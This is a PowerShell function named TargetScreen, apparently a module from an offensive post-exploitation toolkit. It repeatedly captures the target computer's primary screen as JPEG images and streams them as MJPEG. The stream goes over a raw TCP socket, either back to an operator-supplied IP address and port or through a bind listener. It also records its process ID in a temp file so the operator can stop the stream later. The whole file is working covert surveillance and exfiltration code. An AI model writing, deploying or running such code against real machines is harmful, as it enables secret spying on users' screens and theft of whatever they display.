
function TargetScreen
{
    
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]$IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]$Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]$Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]$Bind

    )


    ## @redpill function to stop stream after sellected time (kill pid process)
    $PPID = $PID;echo "$PPID"|Out-File -FilePath "$Env:TMP\mypid.log" -Encoding ascii -Force

    
    while ($true)
    {
        try
        {
            Add-Type -AssemblyName System.Windows.Forms
            [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream

            #Connect back if the reverse switch is used.
            if ($Reverse)
            {
                $socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
                $socket.Connect($IPAddress,$Port)
                Write-Verbose "Connected to $IPAddress"
            }

            #Bind to the provided port if Bind switch is used.
            if ($Bind)
            {
                #Start a listener
                $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $Port)
                $server = new-object System.Net.Sockets.TcpListener $endpoint
                $server.Start()
                $buffer = New-Object byte[] 1024
                $socket = $server.AcceptSocket()
        
            } 
    
            #https://evilevelive.wordpress.com/2009/03/09/web-server-written-in-powershell/
            function SendResponse($sock, $string)
            {
                if ($sock.Connected)
                {
                    $bytesSent = $sock.Send(
                    $string)
                    if ( $bytesSent -eq -1 )
                    {
                        Write-Output "Send failed to " + $sock.RemoteEndPoint
                    }
                }
            }

            function SendStrResponse($sock, $string)
            {
                if ($sock.Connected)
                {
                    $bytesSent = $sock.Send(
                    [text.Encoding]::Ascii.GetBytes($string))
                    if ( $bytesSent -eq -1 )
                    {
                        Write-Output ("Send failed to " + $sock.RemoteEndPoint)
                    }
                }
            }
            #Create the header for MJPEG stream
            function SendHeader(
                [net.sockets.socket] $sock,
                $length,
                $statusCode = "200 OK",
                $mimeHeader="text/html",
                $httpVersion="HTTP/1.1"
                )
            {
                $response = "HTTP/1.1 $statusCode`r`n" +
                "Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n"
                SendStrResponse $sock $response
                Write-Verbose "Header sent to $IPAddress"
            }

            #Send the header
            SendHeader $socket

            while ($True)
            {

                $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                $g = [System.Drawing.Graphics]::FromImage($b)
                $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size)
                $g.Dispose()
                $MemoryStream.SetLength(0)
                $b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg))
                $b.Dispose()
                $length = $MemoryStream.Length
                [byte[]] $Bytes = $MemoryStream.ToArray()
        
                #Set the boundary for the multi-part request
                $str = "`n`n--boundary`n" +
                "Content-Type: image/jpeg`n" +
                "Content-Length: $length`n`n"
        
                #Send Requests
                SendStrResponse $socket $str
                SendResponse $socket $Bytes
            }
            $MemoryStream.Close()
        }
        catch
        {
            Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
            Write-Error $_
        }
    }
}